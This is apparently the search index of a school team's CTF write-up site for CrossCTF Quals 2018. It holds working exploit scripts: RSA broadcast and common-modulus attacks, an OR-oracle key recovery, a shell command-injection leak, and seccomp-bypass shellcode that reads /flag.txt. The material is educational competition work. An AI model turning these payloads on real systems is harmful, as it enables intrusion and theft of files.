{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"OSI Layer 8 CTF Team from NUS High School This website contains a collection of writeups for challenges our team solved.","title":"OSI Layer 8"},{"location":"#osi-layer-8","text":"CTF Team from NUS High School This website contains a collection of writeups for challenges our team solved.","title":"OSI Layer 8"},{"location":"crossctf-quals2018/","text":"CrossCTF Quals 2018 Pwn Easynote binary exploit Even Flow writeup binary exploit Impossible Shellcoding binary exploit Quiet Moon binary exploit Real Baby Pwnable binary exploit Skipping Rope binary exploit Reverse Engineering GoGoGo Manual Labour Misc CYOA writeup Crypto Lossy ORacle writeup script exploit flag BabyRSA writeup exploit BabyRSA2 writeup exploit Web QuirkyScript 1 QuirkyScript 2 QuirkyScript 3 QuirkyScript 4 QuirkyScript 5 Baby Web","title":"CrossCTF Quals 2018"},{"location":"crossctf-quals2018/#crossctf-quals-2018","text":"","title":"CrossCTF Quals 2018"},{"location":"crossctf-quals2018/#pwn","text":"","title":"Pwn"},{"location":"crossctf-quals2018/#easynote","text":"binary exploit","title":"Easynote"},{"location":"crossctf-quals2018/#even-flow","text":"writeup binary exploit","title":"Even Flow"},{"location":"crossctf-quals2018/#impossible-shellcoding","text":"binary exploit","title":"Impossible Shellcoding"},{"location":"crossctf-quals2018/#quiet-moon","text":"binary exploit","title":"Quiet Moon"},{"location":"crossctf-quals2018/#real-baby-pwnable","text":"binary exploit","title":"Real Baby Pwnable"},{"location":"crossctf-quals2018/#skipping-rope","text":"binary exploit","title":"Skipping Rope"},{"location":"crossctf-quals2018/#reverse-engineering","text":"","title":"Reverse Engineering"},{"location":"crossctf-quals2018/#gogogo","text":"Manual Labour","title":"GoGoGo"},{"location":"crossctf-quals2018/#misc","text":"","title":"Misc"},{"location":"crossctf-quals2018/#cyoa","text":"writeup","title":"CYOA"},{"location":"crossctf-quals2018/#crypto","text":"","title":"Crypto"},{"location":"crossctf-quals2018/#lossy-oracle","text":"writeup script exploit flag","title":"Lossy ORacle"},{"location":"crossctf-quals2018/#babyrsa","text":"writeup exploit","title":"BabyRSA"},{"location":"crossctf-quals2018/#babyrsa2","text":"writeup exploit","title":"BabyRSA2"},{"location":"crossctf-quals2018/#web","text":"","title":"Web"},{"location":"crossctf-quals2018/#quirkyscript-1","text":"","title":"QuirkyScript 1"},{"location":"crossctf-quals2018/#quirkyscript-2","text":"","title":"QuirkyScript 2"},{"location":"crossctf-quals2018/#quirkyscript-3","text":"","title":"QuirkyScript 3"},{"location":"crossctf-quals2018/#quirkyscript-4","text":"","title":"QuirkyScript 4"},{"location":"crossctf-quals2018/#quirkyscript-5","text":"","title":"QuirkyScript 5"},{"location":"crossctf-quals2018/#baby-web","text":"","title":"Baby Web"},{"location":"crossctf-quals2018/CYOA/","text":"Choose Your Own Adventure - CrossCTF Quals 2018 (misc) Maybe your question was too long. You reduced the length of your question and asked the oracle again: \"Where's the flag?\" As expected, she had no reaction again. You sigh... maybe the solution really was in there after all. You close your eyes and started willing yourself back into the enemy's base... Non-standard flag format: [A-Z0-9]+ Challenge We are given the hints in this format: 01 01 02, Score: 04 You contribute to the puddle of urine in the corner of this room. Scribbled into the wall is the number 17. Below in red, the number 0 was written. Where would you like to move? 6 -- Down 9 -- Quit 1-6 are used to navigate the location to collect all the hints . And we are also given 4 hints to solve the challenge: Hint 1 for CYOA: len(flag) = 9 Think outside the box for this challenge. It's less of a ctf challenge and more of a misc puzzle tbh... Think about how the contents of each room relate to the coordinates and the score. So now that you can match why each object is in a specific room (with a certain coordinate and score), perhaps think about the scribblings. What's the meaning behind the scribbles? You are looking for a string of characters that leads to the final flag. Link each object in the rooms to the coordinates and figure out the overarching theme of the puzzle. And the words reduced, reaction and solution are italicized, suggesting the topic is chemistry. Interpreting the hints Consider the hint above, urea is one component of urine, with chemical formula CO(NH2)2 - C1O2N2H4, which corresponds to the coordinates(01 01 02) and the score(04). With this in mind we check all the other 19 hints and get all the chemicals . The scribbles in the wall are also unique, ranging from 0 to 19, which suggests the chemicals can be sorted. Scribble Chemical Red no. 0 acetone 1 1 acetic acid 0 2 propene 0 3 nitrous oxide 6 4 acetic acid 0 5 nitrogen 1 6 acetone 1 7 nitrogen 1 8 ozone 3 9 null 0 10 nitrogen 1 11 ozone 3 12 null 0 13 formaldehyde 0 14 ammonia 3 15 water 4 16 methane 0 17 urea 0 18 glycerol 1 19 acetic acid 0 To solve the challenge, we take the (Red no.)th element of the chemical's common name and list them out capsaicin in formula Flag: C18H27NO3","title":"Choose Your Own Adventure - CrossCTF Quals 2018 (misc)"},{"location":"crossctf-quals2018/CYOA/#choose-your-own-adventure-crossctf-quals-2018-misc","text":"Maybe your question was too long. You reduced the length of your question and asked the oracle again: \"Where's the flag?\" As expected, she had no reaction again. You sigh... maybe the solution really was in there after all. You close your eyes and started willing yourself back into the enemy's base... Non-standard flag format: [A-Z0-9]+","title":"Choose Your Own Adventure - CrossCTF Quals 2018 (misc)"},{"location":"crossctf-quals2018/CYOA/#challenge","text":"We are given the hints in this format: 01 01 02, Score: 04 You contribute to the puddle of urine in the corner of this room. Scribbled into the wall is the number 17. Below in red, the number 0 was written. Where would you like to move? 6 -- Down 9 -- Quit 1-6 are used to navigate the location to collect all the hints . And we are also given 4 hints to solve the challenge: Hint 1 for CYOA: len(flag) = 9 Think outside the box for this challenge. It's less of a ctf challenge and more of a misc puzzle tbh... Think about how the contents of each room relate to the coordinates and the score. So now that you can match why each object is in a specific room (with a certain coordinate and score), perhaps think about the scribblings. What's the meaning behind the scribbles? You are looking for a string of characters that leads to the final flag. Link each object in the rooms to the coordinates and figure out the overarching theme of the puzzle. And the words reduced, reaction and solution are italicized, suggesting the topic is chemistry.","title":"Challenge"},{"location":"crossctf-quals2018/CYOA/#interpreting-the-hints","text":"Consider the hint above, urea is one component of urine, with chemical formula CO(NH2)2 - C1O2N2H4, which corresponds to the coordinates(01 01 02) and the score(04). With this in mind we check all the other 19 hints and get all the chemicals . The scribbles in the wall are also unique, ranging from 0 to 19, which suggests the chemicals can be sorted. Scribble Chemical Red no. 0 acetone 1 1 acetic acid 0 2 propene 0 3 nitrous oxide 6 4 acetic acid 0 5 nitrogen 1 6 acetone 1 7 nitrogen 1 8 ozone 3 9 null 0 10 nitrogen 1 11 ozone 3 12 null 0 13 formaldehyde 0 14 ammonia 3 15 water 4 16 methane 0 17 urea 0 18 glycerol 1 19 acetic acid 0 To solve the challenge, we take the (Red no.)th element of the chemical's common name and list them out capsaicin in formula Flag: C18H27NO3","title":"Interpreting the hints"},{"location":"crossctf-quals2018/crypto/BabyRSA/","text":"BabyRSA - CrossCTF Quals 2018 (crypto) Each time I asked for the flag, it gets encoded through RSA. I'm lucky I kept all the values. out.txt . Challenge We're give a list of RSA n(modulus),e(exponent),c(ciphertext) We notice that all the exponents are the same. Vulnerability RSA Algorithm Firstly, 2 distinct primes are chosen, p and q Calculate the modulus with n=pq Calculate \u03bb(n)=lcm(p-1,q-1) Choose the exponent e such that 1 e \u03bb(n) and e and n are coprime Calculate d=e-1 (mod \u03bb(n)) Calculate the ciphertext c with c=m e (mod n) Decryption is done with m=c d (mod n) Common prime factor attack If the random prime generator is flawed, it could produce 2 prime numbers that are the same, and the message can easily be found by calculating p and q, however, every single pair of primes is coprime. Low exponent attack Another option is if c=m e , we can just calculate m=c 1/e and we're done. This would require the exponent to be much smaller compared to the modulus. Since we're given many pairs of c,n,e, we can use the Chinese Remainder Theorem to calculate m e (mod n1*n2*n3...), then we can take the 257th root. This assumes message remains the same Chinese remainder theorem Let N be the product of all the modulus Let N i =N/n i Find integers M i and m i such that M i N i +m i n i =1. Now calculate C=\u03a3c i M i M i mod N C=c i mod n i for all i N is now much larger than 257, so we can just take C 1/e and we're done. exploit Flag: crossctf{Ha5tad_ch4ll3nGes_aRe_Gett1ng_b0riNg_n0w_Eh}","title":"BabyRSA - CrossCTF Quals 2018 (crypto)"},{"location":"crossctf-quals2018/crypto/BabyRSA/#babyrsa-crossctf-quals-2018-crypto","text":"Each time I asked for the flag, it gets encoded through RSA. I'm lucky I kept all the values. out.txt .","title":"BabyRSA - CrossCTF Quals 2018 (crypto)"},{"location":"crossctf-quals2018/crypto/BabyRSA/#challenge","text":"We're give a list of RSA n(modulus),e(exponent),c(ciphertext) We notice that all the exponents are the same.","title":"Challenge"},{"location":"crossctf-quals2018/crypto/BabyRSA/#vulnerability","text":"","title":"Vulnerability"},{"location":"crossctf-quals2018/crypto/BabyRSA/#rsa-algorithm","text":"Firstly, 2 distinct primes are chosen, p and q Calculate the modulus with n=pq Calculate \u03bb(n)=lcm(p-1,q-1) Choose the exponent e such that 1 e \u03bb(n) and e and n are coprime Calculate d=e-1 (mod \u03bb(n)) Calculate the ciphertext c with c=m e (mod n) Decryption is done with m=c d (mod n)","title":"RSA Algorithm"},{"location":"crossctf-quals2018/crypto/BabyRSA/#common-prime-factor-attack","text":"If the random prime generator is flawed, it could produce 2 prime numbers that are the same, and the message can easily be found by calculating p and q, however, every single pair of primes is coprime.","title":"Common prime factor attack"},{"location":"crossctf-quals2018/crypto/BabyRSA/#low-exponent-attack","text":"Another option is if c=m e , we can just calculate m=c 1/e and we're done. This would require the exponent to be much smaller compared to the modulus. Since we're given many pairs of c,n,e, we can use the Chinese Remainder Theorem to calculate m e (mod n1*n2*n3...), then we can take the 257th root. This assumes message remains the same","title":"Low exponent attack"},{"location":"crossctf-quals2018/crypto/BabyRSA/#chinese-remainder-theorem","text":"Let N be the product of all the modulus Let N i =N/n i Find integers M i and m i such that M i N i +m i n i =1. Now calculate C=\u03a3c i M i M i mod N C=c i mod n i for all i N is now much larger than 257, so we can just take C 1/e and we're done. exploit Flag: crossctf{Ha5tad_ch4ll3nGes_aRe_Gett1ng_b0riNg_n0w_Eh}","title":"Chinese remainder theorem"},{"location":"crossctf-quals2018/crypto/BabyRSA2/","text":"BabyRSA2 - CrossCTF Quals 2018 (crypto) Each time I asked for the flag, it gets encoded through RSA.... again... I'm lucky I kept all the values... AGAIN! out.txt . Challenge We're give a list of RSA n(modulus),e(exponent),c(ciphertext) We notice that all the modulus are the same. Vulnerability RSA Algorithm Firstly, 2 distinct primes are chosen, p and q Calculate the modulus with n=pq Calculate \u03bb(n)=lcm(p-1,q-1) Choose the exponent e such that 1 e \u03bb(n) and e and n are coprime Calculate d=e-1 (mod \u03bb(n)) Calculate the ciphertext c with c=m e (mod n) Decryption is done with m=c d (mod n) Common modulus attack Since pq mod n=(p mod n)(q mod n)mod n and m a m b =m ab , if we can find numbers x 1 x 2 ... such that \u03a3x i e i =1, then we can calculate m 1 , assuming all the messages are the same. B\u00e9zout's identity states that if x and y are coprime, then integers a,b exists such that ax+by=1, however, all our exponents share common prime factors, even any 4 exponents share a common factor. However, all 5 exponents do not share a common factor, thus, it is possible to find x 1 x 2 ... such that \u03a3x i e i =1. We can use the extended Euclidean algorithm, however, the numbers resulting from it could be pretty huge, so the equation is evaluated by Mathematica, giving us x=[3239,237,735,556,-6676]. For negative numbers, we can calculate the inverse modulo pretty quickly, and evaluating \u03a0m x i e i (mod n) gives us the flag. exploit Flag: crossctf{RSA_Challenges_Are_Too_Easy}","title":"BabyRSA2 - CrossCTF Quals 2018 (crypto)"},{"location":"crossctf-quals2018/crypto/BabyRSA2/#babyrsa2-crossctf-quals-2018-crypto","text":"Each time I asked for the flag, it gets encoded through RSA.... again... I'm lucky I kept all the values... AGAIN! out.txt .","title":"BabyRSA2 - CrossCTF Quals 2018 (crypto)"},{"location":"crossctf-quals2018/crypto/BabyRSA2/#challenge","text":"We're give a list of RSA n(modulus),e(exponent),c(ciphertext) We notice that all the modulus are the same.","title":"Challenge"},{"location":"crossctf-quals2018/crypto/BabyRSA2/#vulnerability","text":"","title":"Vulnerability"},{"location":"crossctf-quals2018/crypto/BabyRSA2/#rsa-algorithm","text":"Firstly, 2 distinct primes are chosen, p and q Calculate the modulus with n=pq Calculate \u03bb(n)=lcm(p-1,q-1) Choose the exponent e such that 1 e \u03bb(n) and e and n are coprime Calculate d=e-1 (mod \u03bb(n)) Calculate the ciphertext c with c=m e (mod n) Decryption is done with m=c d (mod n)","title":"RSA Algorithm"},{"location":"crossctf-quals2018/crypto/BabyRSA2/#common-modulus-attack","text":"Since pq mod n=(p mod n)(q mod n)mod n and m a m b =m ab , if we can find numbers x 1 x 2 ... such that \u03a3x i e i =1, then we can calculate m 1 , assuming all the messages are the same. B\u00e9zout's identity states that if x and y are coprime, then integers a,b exists such that ax+by=1, however, all our exponents share common prime factors, even any 4 exponents share a common factor. However, all 5 exponents do not share a common factor, thus, it is possible to find x 1 x 2 ... such that \u03a3x i e i =1. We can use the extended Euclidean algorithm, however, the numbers resulting from it could be pretty huge, so the equation is evaluated by Mathematica, giving us x=[3239,237,735,556,-6676]. For negative numbers, we can calculate the inverse modulo pretty quickly, and evaluating \u03a0m x i e i (mod n) gives us the flag. exploit Flag: crossctf{RSA_Challenges_Are_Too_Easy}","title":"Common modulus attack"},{"location":"crossctf-quals2018/crypto/lossyoracle/","text":"LossyORacle - CrossCTF Quals 2018 (crypto) No one believes I can recover the message from this crappy ORacle. nc ctf.pwn.sg 1401 Creator - prokarius (@prokarius) Challenge We are given a service that runs the python script lossyoracle.py . We can connect to the service using nc and it will spit out the encrypted flag. The script reads the flag file, then encrypts it with a key using the following function. def encrypt(data, key, func): length = len(key) output = [] for i in range(len(data)): output.append(func(data[i],key[i%length])) return bytes(output) From the following code, we notice that func over here is just a bitwise OR (|) operation applied to each byte in the flag with the key. function = [lambda x,y:x y, lambda x,y:x|y] print (base64.b64encode(encrypt(data, key, function[1])).decode( utf-8 )) One problematic thing is, the key is always random. Not only that the bytes in the key are random every time, but the length of the key is also random every time! key = [] for i in range(random.randrange(64,128)): key.append(random.randrange(0,255)) key = bytes(key) Vulnerability Or maybe it is not problematic for us, but a helpful vulnerability instead. For the following, we will refer to ON as a bit being equal to 1, while OFF as a bit being equal to 0. Bitwise OR The property of a bitwise OR operation is that bits that are ON (equal to 1) will always stay ON, no matter what the bit is ORed with. This means, for each byte in the flag, for every single bit in them, as long as they are ON, no matter what key is used, they will always be ON after encryption. On the other hand, for bits in the flag that are OFF, sometimes, since the key is randomly generated, they may end up still being OFF after encryption. This means, we can take a lot different ciphertexts, and in at least one of them, the bits that are supposed to be OFF in the original flag must be OFF, since they definitely can't be ON forever, considering we are using a randomly generated key. Bitwise AND Now, the property of a bitwise AND operation is that bits that are OFF (equal to 0) will always stay OFF, no matter what the bit is ANDed with. So, we can just apply the bitwise AND operation on many different ciphertexts together. How this works is that bits that are ON in the flag are ON forever regardless of the key, so even after applying bitwise AND on so many different ciphertexts they will still be ON. On the other hand, if we have many different ciphertexts, there must be at least one occurence where a bit that is originally OFF stays OFF, as the corresponding part of the key encrypting it may be OFF as well. By applying bitwise AND on all the ciphertexts together, this bit will be turned OFF. So, the final result would be a set of bytes, which has the same bits as the flag that are ON, and the same bits that are OFF, which is the flag! Exploit Get many ciphertexts First thing we need is to automate the process of getting ciphertexts since we need A LOT of them. We can easily do it using pwntools. from pwn import * import base64 HOST = 'ctf.pwn.sg' PORT = 1401 r = remote(HOST, PORT) m = base64.b64decode(r.readall().strip().encode('utf-8')) assert len(m) == 14160 Along the way, we also convert the message to the correct encoding, and add a safety check to make sure the number of bytes received is always the same. AND them all! We can write a simple python function to do the bitwise AND between two strings for us. We initialize message to be a bunch of \\xff bytes, which means all bits in it are ON at the start. message = '\\xff' * 14160 def and_strings(s1, s2): return ''.join([chr(ord(s1[i]) ord(s2[i])) for i in range(len(s1))]) Combining all together Our final solution is from pwn import * import base64 HOST = 'ctf.pwn.sg' PORT = 1401 message = '\\xff' * 14160 def and_strings(s1, s2): return ''.join([chr(ord(s1[i]) ord(s2[i])) for i in range(len(s1))]) for i in range(500): print i r = remote(HOST, PORT) m = base64.b64decode(r.readall().strip().encode('utf-8')) assert len(m) == 14160 message = and_strings(message, m) open('flag', 'w').write(message) At first, I tried to read the flag on the terminal, but I get a bunch of unreadable bytes. I was confused and doubted my solution. But then, I remembered it was 14kb of data, sounds more likely to be a file. So, open('flag', 'w').write(message) was added to save the decrypted flag in a file. Reading the flag While doing file flag , I get flag: MPEG ADTS, layer III, v2, 16 kbps, 24 kHz, Monaural A MPEG file! Play it using mpg123 flag and we get the flag!","title":"LossyORacle - CrossCTF Quals 2018 (crypto)"},{"location":"crossctf-quals2018/crypto/lossyoracle/#lossyoracle-crossctf-quals-2018-crypto","text":"No one believes I can recover the message from this crappy ORacle. nc ctf.pwn.sg 1401 Creator - prokarius (@prokarius)","title":"LossyORacle - CrossCTF Quals 2018 (crypto)"},{"location":"crossctf-quals2018/crypto/lossyoracle/#challenge","text":"We are given a service that runs the python script lossyoracle.py . We can connect to the service using nc and it will spit out the encrypted flag. The script reads the flag file, then encrypts it with a key using the following function. def encrypt(data, key, func): length = len(key) output = [] for i in range(len(data)): output.append(func(data[i],key[i%length])) return bytes(output) From the following code, we notice that func over here is just a bitwise OR (|) operation applied to each byte in the flag with the key. function = [lambda x,y:x y, lambda x,y:x|y] print (base64.b64encode(encrypt(data, key, function[1])).decode( utf-8 )) One problematic thing is, the key is always random. Not only that the bytes in the key are random every time, but the length of the key is also random every time! key = [] for i in range(random.randrange(64,128)): key.append(random.randrange(0,255)) key = bytes(key)","title":"Challenge"},{"location":"crossctf-quals2018/crypto/lossyoracle/#vulnerability","text":"Or maybe it is not problematic for us, but a helpful vulnerability instead. For the following, we will refer to ON as a bit being equal to 1, while OFF as a bit being equal to 0.","title":"Vulnerability"},{"location":"crossctf-quals2018/crypto/lossyoracle/#bitwise-or","text":"The property of a bitwise OR operation is that bits that are ON (equal to 1) will always stay ON, no matter what the bit is ORed with. This means, for each byte in the flag, for every single bit in them, as long as they are ON, no matter what key is used, they will always be ON after encryption. On the other hand, for bits in the flag that are OFF, sometimes, since the key is randomly generated, they may end up still being OFF after encryption. This means, we can take a lot different ciphertexts, and in at least one of them, the bits that are supposed to be OFF in the original flag must be OFF, since they definitely can't be ON forever, considering we are using a randomly generated key.","title":"Bitwise OR"},{"location":"crossctf-quals2018/crypto/lossyoracle/#bitwise-and","text":"Now, the property of a bitwise AND operation is that bits that are OFF (equal to 0) will always stay OFF, no matter what the bit is ANDed with. So, we can just apply the bitwise AND operation on many different ciphertexts together. How this works is that bits that are ON in the flag are ON forever regardless of the key, so even after applying bitwise AND on so many different ciphertexts they will still be ON. On the other hand, if we have many different ciphertexts, there must be at least one occurence where a bit that is originally OFF stays OFF, as the corresponding part of the key encrypting it may be OFF as well. By applying bitwise AND on all the ciphertexts together, this bit will be turned OFF. So, the final result would be a set of bytes, which has the same bits as the flag that are ON, and the same bits that are OFF, which is the flag!","title":"Bitwise AND"},{"location":"crossctf-quals2018/crypto/lossyoracle/#exploit","text":"","title":"Exploit"},{"location":"crossctf-quals2018/crypto/lossyoracle/#get-many-ciphertexts","text":"First thing we need is to automate the process of getting ciphertexts since we need A LOT of them. We can easily do it using pwntools. from pwn import * import base64 HOST = 'ctf.pwn.sg' PORT = 1401 r = remote(HOST, PORT) m = base64.b64decode(r.readall().strip().encode('utf-8')) assert len(m) == 14160 Along the way, we also convert the message to the correct encoding, and add a safety check to make sure the number of bytes received is always the same.","title":"Get many ciphertexts"},{"location":"crossctf-quals2018/crypto/lossyoracle/#and-them-all","text":"We can write a simple python function to do the bitwise AND between two strings for us. We initialize message to be a bunch of \\xff bytes, which means all bits in it are ON at the start. message = '\\xff' * 14160 def and_strings(s1, s2): return ''.join([chr(ord(s1[i]) ord(s2[i])) for i in range(len(s1))])","title":"AND them all!"},{"location":"crossctf-quals2018/crypto/lossyoracle/#combining-all-together","text":"Our final solution is from pwn import * import base64 HOST = 'ctf.pwn.sg' PORT = 1401 message = '\\xff' * 14160 def and_strings(s1, s2): return ''.join([chr(ord(s1[i]) ord(s2[i])) for i in range(len(s1))]) for i in range(500): print i r = remote(HOST, PORT) m = base64.b64decode(r.readall().strip().encode('utf-8')) assert len(m) == 14160 message = and_strings(message, m) open('flag', 'w').write(message) At first, I tried to read the flag on the terminal, but I get a bunch of unreadable bytes. I was confused and doubted my solution. But then, I remembered it was 14kb of data, sounds more likely to be a file. So, open('flag', 'w').write(message) was added to save the decrypted flag in a file.","title":"Combining all together"},{"location":"crossctf-quals2018/crypto/lossyoracle/#reading-the-flag","text":"While doing file flag , I get flag: MPEG ADTS, layer III, v2, 16 kbps, 24 kHz, Monaural A MPEG file! Play it using mpg123 flag and we get the flag!","title":"Reading the flag"},{"location":"crossctf-quals2018/pwn/evenflow/","text":"Even Flow - CrossCTF Quals 2018 (pwn) Do you like shell command injection? nc ctf.pwn.sg 1601 Creator - amon (@nn_amon) Challenge We are given a python script that is ran upon connection to the challenge server. Mainly, it reads in 2 strings. First, a string that is called \"flag\", and then another string consisting of only 2 bytes called \"shell\". sys.stdout.write( Flag: ) sys.stdout.flush() flag = sys.stdin.readline().strip() sys.stdout.write( Shell: ) sys.stdout.flush() shell = sys.stdin.read(2) The \"flag\" would be passed as an argument into the evenflow binary, while the \"shell\" is just being passed to echo . os.system( ./evenflow + flag + ; echo \\ + shell + \\ ); We were also given the source of evenflow , which just reads the flag from a file, and performs strcmp on the \"flag\" that we passed in and the actual flag. size_t get_file_size(char * filename) { struct stat st; stat(filename, st); return st.st_size; } int main(int argc, char ** argv) { FILE * fd = fopen( flag , r ); size_t file_size = get_file_size( flag ); char * buffer = malloc(file_size); fread(buffer, 1, file_size, fd); return strcmp(buffer, argv[1]); } The interesting part of this code is the last line, return strcmp(buffer, argv[1]); According to documentation, strcmp will return a number that says how far the first differing character is away from each other. Exploit $? In a shell, $? contains the return value of the previous command. Since we are allowed to pass a string of 2 bytes to echo , we can just send in $? for \"shell\". So, we can call echo $? which will give us the return value of ./evenflow flag , which will let us know how far away is the first differing character from the actual flag. With this information, we can keep \"correcting\" our flag until we get the actual flag. Script We can write a script to automate this process. from pwn import * def tryf(flag): p = remote('ctf.pwn.sg', 1601) p.sendlineafter('Flag: ', flag) p.sendlineafter('Shell: ', '$?') # returns the return value of evenflow return int(p.recvline()) # The Idea: # Basically, we compare the actual flag to 0 , # Then adjust it based on the output of strcmp (the exit code) # e.g. to C , then add a 0 = C0 # and repeat till we get } , the end of the flag s = 0 while True: i = tryf(s) # adjust! c = chr(ord('0')+i) s = s[:-1] + c if s[-1] == '}': print(s) break s+='0'","title":"Even Flow - CrossCTF Quals 2018 (pwn)"},{"location":"crossctf-quals2018/pwn/evenflow/#even-flow-crossctf-quals-2018-pwn","text":"Do you like shell command injection? nc ctf.pwn.sg 1601 Creator - amon (@nn_amon)","title":"Even Flow - CrossCTF Quals 2018 (pwn)"},{"location":"crossctf-quals2018/pwn/evenflow/#challenge","text":"We are given a python script that is ran upon connection to the challenge server. Mainly, it reads in 2 strings. First, a string that is called \"flag\", and then another string consisting of only 2 bytes called \"shell\". sys.stdout.write( Flag: ) sys.stdout.flush() flag = sys.stdin.readline().strip() sys.stdout.write( Shell: ) sys.stdout.flush() shell = sys.stdin.read(2) The \"flag\" would be passed as an argument into the evenflow binary, while the \"shell\" is just being passed to echo . os.system( ./evenflow + flag + ; echo \\ + shell + \\ ); We were also given the source of evenflow , which just reads the flag from a file, and performs strcmp on the \"flag\" that we passed in and the actual flag. size_t get_file_size(char * filename) { struct stat st; stat(filename, st); return st.st_size; } int main(int argc, char ** argv) { FILE * fd = fopen( flag , r ); size_t file_size = get_file_size( flag ); char * buffer = malloc(file_size); fread(buffer, 1, file_size, fd); return strcmp(buffer, argv[1]); } The interesting part of this code is the last line, return strcmp(buffer, argv[1]); According to documentation, strcmp will return a number that says how far the first differing character is away from each other.","title":"Challenge"},{"location":"crossctf-quals2018/pwn/evenflow/#exploit","text":"","title":"Exploit"},{"location":"crossctf-quals2018/pwn/evenflow/#_1","text":"In a shell, $? contains the return value of the previous command. Since we are allowed to pass a string of 2 bytes to echo , we can just send in $? for \"shell\". So, we can call echo $? which will give us the return value of ./evenflow flag , which will let us know how far away is the first differing character from the actual flag. With this information, we can keep \"correcting\" our flag until we get the actual flag.","title":"$?"},{"location":"crossctf-quals2018/pwn/evenflow/#script","text":"We can write a script to automate this process. from pwn import * def tryf(flag): p = remote('ctf.pwn.sg', 1601) p.sendlineafter('Flag: ', flag) p.sendlineafter('Shell: ', '$?') # returns the return value of evenflow return int(p.recvline()) # The Idea: # Basically, we compare the actual flag to 0 , # Then adjust it based on the output of strcmp (the exit code) # e.g. to C , then add a 0 = C0 # and repeat till we get } , the end of the flag s = 0 while True: i = tryf(s) # adjust! c = chr(ord('0')+i) s = s[:-1] + c if s[-1] == '}': print(s) break s+='0'","title":"Script"},{"location":"crossctf-quals2018/pwn/impossible_shellcoding/","text":"Impossible Shellcoding - CrossCTF Quals 2018 (pwn) The flag is at /flag.txt. nc ctf.pwn.sg 7123 Creator - jarsp (@jarsp) Challenge Opening this up in radare2, we can get the following pseudocode. prctl(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)); prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, seccomp_rules, 0, 0); char* buffer = mmap(0x40404000, 0x1000, 7, 0x32); read(0, buffer, 0x100); // runs the shellcode that was read into the buffer void (*func)() = buffer; func(); So, this is a shellcoding challenge, except that it is not so straightforward. There are 2 prctl calls that are designed to make our life difficult. The first one prevents us from running the program as other users, by blocking set-user-id and set-group-id functions. The second one sets up SECCOMP rules, which is a filter to block certain syscalls, based on the syscall number (K in the table below). Using seccomp-tools , we can get the following table. line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x00 0xc000003e /* no-op */ 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x0c 0x00 0x40000000 if (A = 0x40000000) goto 0016 0004: 0x15 0x0b 0x00 0x00000002 if (A == open) goto 0016 0005: 0x15 0x0a 0x00 0x00000101 if (A == openat) goto 0016 0006: 0x15 0x09 0x00 0x00000055 if (A == creat) goto 0016 0007: 0x15 0x08 0x00 0x0000003b if (A == execve) goto 0016 0008: 0x15 0x07 0x00 0x00000039 if (A == fork) goto 0016 0009: 0x15 0x06 0x00 0x0000003a if (A == vfork) goto 0016 0010: 0x15 0x05 0x00 0x00000142 if (A == execveat) goto 0016 0011: 0x15 0x04 0x00 0x00000038 if (A == clone) goto 0016 0012: 0x15 0x03 0x00 0x00000065 if (A == ptrace) goto 0016 0013: 0x15 0x02 0x00 0x0000009d if (A == prctl) goto 0016 0014: 0x15 0x01 0x00 0x0000009e if (A == arch_prctl) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0016: 0x06 0x00 0x00 0x00000000 return KILL SECCOMP We see that execve and execveat are blocked, which means no shell for us. Ok. As for ORW (open, read, write) capabilities, open and openat are blocked so we cannot do the typical procedure of open ing the file, read ing from the file into a buffer, then finally write ing the buffer into standard output. Great. fork / vfork / clone are blocked, so we can't create new processes that are free of these seccomp restrictions. There was a writeup on a similar challenge, which uses the x32 ABI . How this works is we can syscall 0x40000000 + syscall_num_you_actually_want to call the syscall and bypass seccomp, due to the x32 ABI of kernels. Sadly at line 0x003, any syscall greater than 0x40000000 is also blocked. So far, the major problem is that open() and its variants can't be used, however read / write are still available so we do not need to worry about that. There is another syscall called open_by_handle_at that I wanted to use, but for it to work the binary had to be root (I wasted 5 hours on this). retf However, there is still one more trick - executing 32-bit code instead. In 32-bit code, we can use 32-bit syscalls (which have different syscall numbers) to bypass the seccomp filter, as the seccomp filter only blocks the syscall based on its number. To run 32-bit code from 64-bit code, we can use the retf instruction which pops 2 values from the stack, the first being the next instruction address and the second being the new value of the CS (Code Segment) register. If the CS register becomes 0x33, it is executing 64-bit code, whereas if the CS register becomes 0x23, it is executing 32-bit code. One important thing to take note is, since 32-bit code can only read the lower 32-bits from 64-bit registers, we have to make sure we reset the registers the shellcode uses to lower values (including the instruction pointer register!). Exploit The exploit consists of two parts, firstly, 64-bit shellcode that does the following: 1. mmap with low addresses with RWX (read-write-exec) permissions 2. Read in 32-bit shellcode that opens the file and reads it into the mmap ed memory because the orginal binary only reads in 256 bytes - not enough! 3. retf to the mmap'ed memory to run the 32-bit shellcode mmap = ''' xor rax, rax mov al, 9 mov rdi, 0x602000 mov rsi, 0x1000 mov rdx, 7 mov r10, 0x32 mov r8, 0xffffffff mov r9, 0 syscall''' read = ''' mov rax, 0 xor rdi, rdi mov rsi, 0x602190 mov rdx, 100 syscall''' retf = ''' xor rsp, rsp mov esp, 0x602160 mov DWORD PTR [esp+4], 0x23 mov DWORD PTR [esp], 0x602190 retf ''' sc = mmap + read + retf f = asm(sc) p.sendline(f) The second step is just to send in 32-bit shellcode to read the flag. # Send 32-bit shellcode that open-reads the flag and writes to stdout # Copied from http://shell-storm.org/shellcode/files/shellcode-73.php p.sendline( \\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2 + \\xeb\\x32\\x5b\\xb0\\x05\\x31\\xc9\\xcd + \\x80\\x89\\xc6\\xeb\\x06\\xb0\\x01\\x31 + \\xdb\\xcd\\x80\\x89\\xf3\\xb0\\x03\\x83 + \\xec\\x01\\x8d\\x0c\\x24\\xb2\\x01\\xcd + \\x80\\x31\\xdb\\x39\\xc3\\x74\\xe6\\xb0 + \\x04\\xb3\\x01\\xb2\\x01\\xcd\\x80\\x83 + \\xc4\\x01\\xeb\\xdf\\xe8\\xc9\\xff\\xff + \\xff + /flag.txt\\x00 ) Finally, print(p.recv()) to get the flag.","title":"Impossible Shellcoding - CrossCTF Quals 2018 (pwn)"},{"location":"crossctf-quals2018/pwn/impossible_shellcoding/#impossible-shellcoding-crossctf-quals-2018-pwn","text":"The flag is at /flag.txt. nc ctf.pwn.sg 7123 Creator - 